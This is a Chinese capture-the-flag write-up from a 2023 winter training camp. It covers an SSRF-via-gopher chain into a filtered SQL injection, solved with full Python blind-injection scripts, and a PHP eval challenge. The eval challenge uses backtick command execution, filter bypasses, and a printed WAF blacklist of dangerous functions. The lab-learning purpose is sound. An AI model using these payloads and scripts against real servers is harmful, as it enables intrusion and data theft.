2023ROIS冬令营梦开始的地方。。。。。 week1week2week3week4internal这是什么，两个超链接，点一下（ ​ SQLI页面中的内容： 1234567891011121314151617&lt;?phprequire_once('config.php');if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') { highlight_file(__FILE__); die('Try to access it from internal!');}echo &quot;Welcome!
&quot;;$id = $_POST['id'];if (preg_match(&quot;/union| /i&quot;,$id)) die('You bad bad &gt;_&lt;');$con = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);$sql = &quot;SELECT * FROM messages WHERE id=$id&quot;; // SQLI &gt;_&lt;$res = mysqli_query($con, $sql);$message = mysqli_fetch_array($res)['message'];echo $message;#回显Try to access it from internal! if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1')用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面： 123456789&lt;?phphighlight_file(__FILE__);// Hint: Do you know gopher?$url = $_POST['url'];if (preg_match(&quot;/file:|ftp:|http:|scp:|dict:/i&quot;,$url)) die('You bad bad &gt;_&lt;');$ch = curl_init($url);$res = curl_exec($ch);echo $res; curl_init()函数初始化一个curl绘会话，值传给$ch，curl_exec()函数执行一个curl会话，值传给$res。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：&quot;Do you know gopher?&quot;。emmm。。。并不知道。那就学呗。找到了一篇讲的比较详细的文章学习了一下。 gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。 gopher协议的格式： 1gopher://&lt;host&gt;:&lt;port&gt;/_后接TCP数据流 需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是%0D%0A，使用脚本或工具编码后回车换行会变成%0A，因此要多一步replace的步骤。在HTTP包的最后要加%0D%0A，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例： GET请求： 准备好一个监听机和一个用户机： nc -lp 1234监听1234端口，使用curl发送http请求curl gopher://172.17.0.1:1234/abcd，监听机收到消息为”bcd”；发送请求curl gopher://172.17.0.1:1234/aabcdnc监听到abcd。因此紧跟在&quot;&lt;PORT&gt;/&quot;字符后面的一个字符会被忽略，可换为任意一个字符。 这是一段网页源码，作用是将GET传入的name的值打印出来： 1234&lt;?php echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;
&quot;?&gt;#保存为ssrf.php 这是一个GET请求包 123GET /ssrf.php?name=Potatowo HTTP/1.1Host: 172.17.0.1#回车 经Python脚本编写，生成对应的请求包 1234567891011import urllib.parsedata = \&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1Host: 172.17.0.1#该行要有回车，HTTP数据包结尾&quot;&quot;&quot;result = urllib.parse.quote(data)result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;print(result)#output#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A 改为构成符合gopher协议的请求后通过curl发出请求： 12curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。 POST请求： 这是一段网页源码，功能不做过多赘述： 1234&lt;?php echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;
&quot;?&gt;#保存为ssrf.php 这是一个POST请求包： 1234567POST /ssrf/base/post.php HTTP/1.1host:172.17.0.1Content-Type:application/x-www-form-urlencodedContent-Length:11name=Potatowo#回车 改为构成符合gopher协议的请求后通过curl发出请求： 12curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。 现在回到本题； 既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包： 1234567891011121314151617181920212223242526import urllib.parsedata = \&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1Content-Length: 4Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeid=1&quot;&quot;&quot;result = urllib.parse.quote(data)result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = result = urllib.parse.quote(result)#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码print(result)#output#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A 改为符合gopher协议的形式，注意由于curl_exec()的执行是在服务端里进行的，所以gopher://协议的地址应改为127.0.0.1:80，80端口是跑web服务的端口。 将脚本中的content进行修改，content = &quot;id=1 and 1=1&quot;，传入，结果： emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼 12if (preg_match(&quot;/union| /i&quot;,$id)) die('You bad bad &gt;_&lt;'); 看来是ban掉了union和空格。难怪，那改成content = &quot;id=1/**/and/**/1=1&quot;绕过空格过滤，回显&quot;Welcome! meow meow meow~1&quot;，改成content = &quot;id=1/**/and/**/1=2&quot;，回显&quot;Welcome! 1&quot;。sql语句判断为真会返回&quot;Welcome! meow meow meow~1&quot;，为假不含meow meow meow~，同时union被ban了，尝试用加号拼接&quot;uni&quot;,&quot;on&quot;，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。 完善脚本： 123456789101112131415161718192021222324252627282930313233import urllib.parseimport requestsurl = &quot;http://192.168.150.1:43083/curl.php&quot;for i in range(0,126): content = &quot;id=1 and (length(database())={})#&quot;.format(i) content = content.replace(&quot; &quot;, &quot;/**/&quot;)#SQL页面存在空格过滤用/**/绕过 content_length = len(content) data = \#切记切记下面字符串每行左边要贴边，不然tab会被编码f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {content_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close{content}&quot;&quot;&quot; result = urllib.parse.quote(data) result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) payload = &quot;gopher://127.0.0.1:80/_&quot;+result#用python直接传参只需要编码一次 r = requests.post(url,data={&quot;url&quot;:payload}).text #print(r) if &quot;meow&quot; in r:#如果sql返回为真，页面会显示&quot;meow meow~&quot; print(i) break#output#3 输出3，得出数据库长度为3。 123456789101112131415161718192021222324252627282930313233343536373839import urllib.parseimport requestsurl = &quot;http://192.168.150.1:43083/curl.php&quot;database = &quot;&quot;for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr(database(),{},1))={})#&quot;.format(i,j)#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot; content = content.replace(&quot; &quot;, &quot;/**/&quot;)#SQL页面存在空格过滤用/**/绕过 content_length = len(content) data =  &quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {content_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close{content}&quot;&quot;&quot; result = urllib.parse.quote(data) result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) payload = &quot;gopher://127.0.0.1:80/_&quot;+result r = requests.post(url,data={&quot;url&quot;:payload}).text #print(r) if &quot;meow&quot; in r: database += chr(j) print(database) break#output#r#ru#rua#数据库名为rua 同样，爆表名，因为可能存在多个表，所以使用group_concat() 123456789101112131415161718for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),{},1))={})#&quot;.format(i,j) ...........#output#f#fl#fla#flag#flag,#flag,m#flag,me#flag,mes#flag,mess#flag,messa#flag,messag#flag,message#flag,messages 盲猜flag在flag表里，爆字段名： 123456789for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'flag'),{},1))={})#&quot;.format(i,j)#爆字段名 ...........#output#f#fl#fla#flag 已知信息： 数据库rua、表flag、字段flag，爆flag内容： 123for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(flag) from flag),{},1))={})#&quot;.format(i,j)#爆flag表内容 拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import urllib.parseimport requestsdef fuck(): url = &quot;http://192.168.150.1:43083/curl.php&quot; result=&quot;&quot; for i in range(1,1290): head=32 tail=127 while head&lt;tail: mid=(head+tail)&gt;&gt;1 sqli = &quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='rua'),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),{},1))&gt;{},1,0)%23&quot;.format(i,mid) id = urllib.parse.quote(sqli) id_length = len(id)+3 payload = f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {id_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeid={id}&quot;&quot;&quot; # print(payload) tmp = urllib.parse.quote(payload) new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) res = 'gopher://127.0.0.1:80/_' + new dataa = { &quot;url&quot;:res } r = requests.post(url=url,data=dataa) # print(r.text) if &quot;meow meow meow&quot; in r.text: head=mid+1 else: tail=mid if head !=32: result+=chr(head) else: break print(result)fuck() 当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭 （感谢LinTu提供的思路） 浏览器发送一次请求，记住python出payload的时候要url编码两次 Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破 异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。 cachewaf一道初见被乱杀的防火墙绕过。 12345&lt;?phprequire_once('waf.php');highlight_file(__FILE__);eval($_POST['cmd']);?&gt; 简短的题目，极致的享受（× 这eval就摆在面前就别怪system直接shell了( emmm，说是右括号出了点问题，考虑到这道题有防火墙，先排查一下问题出哪了。 看起来括号本身应该不是问题，echo也没被过滤，引号也没问题，应该是system被拦截了，继续尝试。 1cmd=echo (&quot;system&quot;)(&quot;ls&quot;); 1cmd=echo `ls`; (“system”)和反引号没被过滤。 1cmd=echo `ls /`;#查看根目录下发现存在/flag 1cmd=echo `cat /flag`;#尝试读取flag，结果没有回显，看起来flag被过滤了 1234cmd=echo `cat /f*`;cmd=echo `cat /fl'a'g`;cmd=echo `cat /f?ag`;#尝试上述两种绕过均可读取到flag 但是提交flag时发现是假的flag，果然不可能这么简单啊（悲 既然这样不妨看一看waf.php查看下防火墙规则吧（waf.php也被过滤了用w*绕过，网页直接读取文件没有分行实在难受，就用bp抓包后发传参了） waf.php内容如下： &lt;?phpsession_start();//config$sql_blacklist = &quot;/drop\s*|dumpfile\s*|INTO FILE\s*|outfile\s*|load_file\s*|multipoint\s*/i&quot;;$rce_blacklist = &quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\s*\(/i&quot;;$key_blacklist=&quot;/_GET|_POST|_COOKIE|_FILE|_SERVER|_SESSION|flag|waf/i&quot;;$config2333=[ &quot;cachestore&quot;=&gt;&quot;&quot;, &quot;flagFormat&quot;=&gt;&quot;ROIS&quot;,//=&gt; /ROIS{643124e14ecfc643124e14ecff}/i &quot;filterFunc&quot;=&gt;[ &quot;fileterOriginFlag&quot;, &quot;fileterBase64Flag&quot; ], &quot;filterInputRule&quot;=&gt;[ $sql_blacklist, $rce_blacklist, $key_blacklist ],//filter input &quot;fileFilter&quot;=&gt;true];//config endsif(!$config2333[&quot;cachestore&quot;]){ if(stripos(PHP_OS,&quot;WIN&quot;)===false){ //Linux $config2333[&quot;cachestore&quot;]=&quot;/tmp/cached&quot;; }else{ //Windows $config2333[&quot;cachestore&quot;]=&quot;cached&quot;; }}if(!is_dir($config2333[&quot;cachestore&quot;])){ mkdir($config2333[&quot;cachestore&quot;]); $config2333[&quot;cachestore&quot;] = realpath($config2333[&quot;cachestore&quot;]);}class CacheWaf{ public $config2333; public function __construct($config2333) { $this-&gt;config2333 = $config2333; //check cache exists $this-&gt;cacheExists(self::reqid()); //filter input foreach ($this-&gt;config2333[&quot;filterInputRule&quot;] as $black_list){ $_GET=filter_arr($black_list,$_GET); $_POST=filter_arr($black_list,$_POST); $_COOKIE=filter_arr($black_list,$_COOKIE); foreach ($_SERVER as $key =&gt;&amp;$value){ $value = strong_replace($black_list,&quot;&quot;,$value); } $_SESSION=filter_arr($black_list,$_SESSION); $_FILES=filter_arr($black_list,$_FILES); } //filter upload file if($this-&gt;config2333[&quot;fileFilter&quot;]){ foreach ($_FILES as $key =&gt; $value) { if(is_array($value[&quot;tmp_name&quot;])){ foreach ($value[&quot;tmp_name&quot;] as $k=&gt;$v){ $fileCon = file_get_contents($v); foreach ($this-&gt;config2333[&quot;filterInputRule&quot;] as $black_list){ $fileCon = strong_replace($black_list,&quot;&quot;,$fileCon); } file_put_contents($v,$fileCon); } }else{ $fileCon = file_get_contents($value[&quot;tmp_name&quot;]); foreach ($this-&gt;config2333[&quot;filterInputRule&quot;] as $black_list){ $fileCon = strong_replace($black_list,&quot;&quot;,$fileCon); } file_put_contents($value['tmp_name'],$fileCon); } } } //cache start ob_start(&quot;cacheCtrl&quot;); } public function __destruct() { @ob_end_flush(); } public function cacheExists($reqid){ $cacheFilePath=$this-&gt;config2333[&quot;cachestore&quot;].&quot;/&quot;.$reqid; if(file_exists($cacheFilePath)){ die(file_get_contents($cacheFilePath)); } } public static function reqid(){ $cookie = $_COOKIE; $get = $_GET; $requri=$_SERVER[&quot;SCRIPT_NAME&quot;]; $post = file_get_contents(&quot;php://input&quot;); $file = &quot;&quot;; foreach ($_FILES as $key =&gt; $value) { if(is_array($value[&quot;tmp_name&quot;])){ foreach ($value[&quot;tmp_name&quot;] as $k=&gt;$v){ $fileCon = file_get_contents($v); } }else{ $fileCon = file_get_contents($value[&quot;tmp_name&quot;]); } $file.=$fileCon; } sort($cookie); sort($get); $idcon=$requri.implode($cookie).implode($get).$post.$file; return md5($idcon); }}function fileterOriginFlag($buffer,$fakeflag,$flagFormat){ $buffer=preg_replace(&quot;/&quot;.$flagFormat.&quot;{.*}/im&quot;, $fakeflag,$buffer); return $buffer;}function fileterBase64Flag($buffer,$fakeflag,$flagFormat){ $base64flag = base64_encode($flagFormat); if(strrpos($base64flag,&quot;==&quot;)!==false){ $base64flag = substr($base64flag,0,-3); }elseif(strrpos($base64flag,&quot;=&quot;)!==false){ $base64flag = substr($base64flag,0,-2); } if(strpos($buffer,$base64flag)!==false){ $buffer=preg_replace(&quot;#$base64flag&quot;.&quot;[0-9a-zA-Z/+]+#&quot;, base64_encode($fakeflag),$buffer); } return $buffer;}function strong_replace ($rule,$replace,$str){ while(true){ $tmpstr = preg_replace($rule,$replace,$str); if($tmpstr === $str){ break; } $str = $tmpstr; } return $str;}function filter_arr($rule,$arr){ if($arr===null)return $arr; foreach ($arr as $key =&gt; $val){ //filter $key $tmpkey=strong_replace($rule,&quot;&quot;,$key); if(is_array($val)){ $tmpval = filter_arr($rule,$val); }else{ $tmpval = strong_replace($rule,&quot;&quot;,$val); } unset($arr[$key]); $arr[$tmpkey] = $tmpval; } return $arr;}function cacheCtrl($buffer) { //filter output chdir(dirname($_SERVER['SCRIPT_FILENAME'])); global $config2333; $uniqid = uniqid().un